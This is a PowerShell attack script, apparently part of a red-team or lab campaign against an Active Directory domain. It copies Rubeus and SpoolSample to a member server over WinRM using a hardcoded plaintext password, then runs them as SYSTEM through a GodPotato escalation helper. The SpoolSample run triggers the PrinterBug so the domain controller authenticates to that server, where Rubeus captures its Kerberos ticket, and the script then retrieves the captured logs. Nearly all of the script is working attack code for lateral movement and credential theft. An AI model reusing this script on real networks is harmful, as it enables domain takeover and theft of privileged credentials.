[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$TargetDC = "dc02.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$CaptureServer = "mbr01.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$RemoteDir = "C:\Windows\Temp\cadre-tools",
    [Parameter(Mandatory=$false)]
    [int]$MonitorSeconds = 60
)
$ErrorActionPreference = "Stop"

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", $securePass)

# Stage Rubeus + SpoolSample on mbr01 from ws01 beachhead (T1570)
$srcRubeus = Join-Path $ToolSource "Rubeus.exe"
$srcSpool = Join-Path $ToolSource "Sliver\SpoolSample.exe"
if (-not (Test-Path $srcSpool)) { $srcSpool = Join-Path $ToolSource "SpoolSample.exe" }
if (-not (Test-Path $srcSpool)) { $srcSpool = Join-Path $ToolSource "Old_Tools\SpoolSample.exe" }
if (-not (Test-Path $srcRubeus)) { throw "Rubeus.exe not found in $ToolSource" }
if (-not (Test-Path $srcSpool)) { throw "SpoolSample.exe not found in $ToolSource" }

$remoteRubeus = Join-Path $RemoteDir "Rubeus.exe"
$remoteSpool = Join-Path $RemoteDir "SpoolSample.exe"
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($d) New-Item -ItemType Directory -Force -Path $d | Out-Null } -ArgumentList $RemoteDir
    Copy-Item -Path $srcRubeus -Destination $remoteRubeus -ToSession $sess -Force
    Copy-Item -Path $srcSpool -Destination $remoteSpool -ToSession $sess -Force
    Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) icacls $p1 /grant "Everyone:(RX)" | Out-Null; icacls $p2 /grant "Everyone:(RX)" | Out-Null } -ArgumentList $remoteRubeus,$remoteSpool
    Write-Output "T102_OK: STAGED Rubeus -> $remoteRubeus, SpoolSample -> $remoteSpool"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$timestamp = Get-Date -Format yyyyMMddHHmmss
$monitorOut = Join-Path $RemoteDir "T102-rubeus-monitor-$timestamp.txt"
$spoolOut = Join-Path $RemoteDir "T102-spoolsample-$timestamp.txt"

# Build the SYSTEM-side script block to run on mbr01 via the SQL -> GodPotato channel
# This runs as NT AUTHORITY\SYSTEM on mbr01, so background process creation is reliable.
$systemScript = @"
`$rubeus = '$remoteRubeus'
`$spool = '$remoteSpool'
`$monitorOut = '$monitorOut'
`$spoolOut = '$spoolOut'
`$targetDC = '$TargetDC'
`$captureServer = '$CaptureServer'

# Start Rubeus monitor as a detached process (SYSTEM context)
`$psi = New-Object System.Diagnostics.ProcessStartInfo
`$psi.FileName = `$rubeus
`$psi.Arguments = 'monitor /interval:5 /targetuser:' + `$targetDC + '`$' + ' /nowrap'
`$psi.RedirectStandardOutput = `$monitorOut
`$psi.RedirectStandardError = `$monitorOut
`$psi.UseShellExecute = `$false
`$psi.CreateNoWindow = `$true
`$proc = [System.Diagnostics.Process]::Start(`$psi)
Write-Output ("T102_MONITOR_PID: " + `$proc.Id)

Start-Sleep -Seconds 3

# Trigger PrinterBug to coerce dc02$ to authenticate to mbr01
`$spoolOutput = & `$spool `$targetDC `$captureServer 2>&1
`$spoolOutput | Out-File -FilePath `$spoolOut -Append -Encoding ASCII
Write-Output "T102_SPOOL_TRIGGERED"

Start-Sleep -Seconds $MonitorSeconds

Write-Output "T102_MONITOR_DONE"
"@

# Execute the SYSTEM-side script block via the proven helper
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -GpPath (Join-Path $RemoteDir "GodPotato.exe") -ScriptBlock $systemScript

Start-Sleep -Seconds 5

# Pull monitor output back to ws01
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) icacls $p1 /grant "Everyone:(R)" | Out-Null; icacls $p2 /grant "Everyone:(R)" | Out-Null } -ArgumentList $monitorOut,$spoolOut
    $localDir = "C:\Tools\cadre-attack"
    if (-not (Test-Path $localDir)) { New-Item -ItemType Directory -Path $localDir -Force | Out-Null }
    Copy-Item -Path $monitorOut -Destination "$localDir\T102-rubeus-monitor-$timestamp.txt" -FromSession $sess -Force
    Copy-Item -Path $spoolOut -Destination "$localDir\T102-spoolsample-$timestamp.txt" -FromSession $sess -Force
    Write-Output "T102_OK: PULLED monitor/spool logs to $localDir"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

# Display pulled monitor output
$localMonitor = "$localDir\T102-rubeus-monitor-$timestamp.txt"
if (Test-Path $localMonitor) {
    Write-Output "=== T102 Rubeus monitor output ==="
    Get-Content $localMonitor -ErrorAction SilentlyContinue | Select-Object -First 100
}
